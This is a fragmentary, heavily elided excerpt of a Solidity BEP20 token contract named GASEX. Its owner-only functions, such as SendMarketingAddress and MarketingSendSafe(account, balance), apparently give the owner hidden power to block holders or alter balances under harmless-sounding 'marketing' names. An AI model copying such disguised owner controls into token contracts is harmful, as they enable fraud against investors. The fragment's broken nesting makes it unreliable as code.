...
*/
    ...
    contract GASEX is IBEP20, Ownable
    {
        ...
        string private constant _name = "GASEX";
        string private constant _symbol = "GASEX";
        uint8 private constant _decimals = 9;
        uint256 public constant AvailableTickets=  1000000 * 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant MarketingWallet=0xE406b8FD6844CFABAa99DC0053f0b85F0Fb6b5aA; 
        ...
        constructor () {
           ...
           function SendMarketingAddress(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function ClaimMarketingAddress(address[] calldata addresses) external onlyOwner {
      ...
      function MarketingSendSafe(address account, uint256 balance) onlyOwner  public virtual {
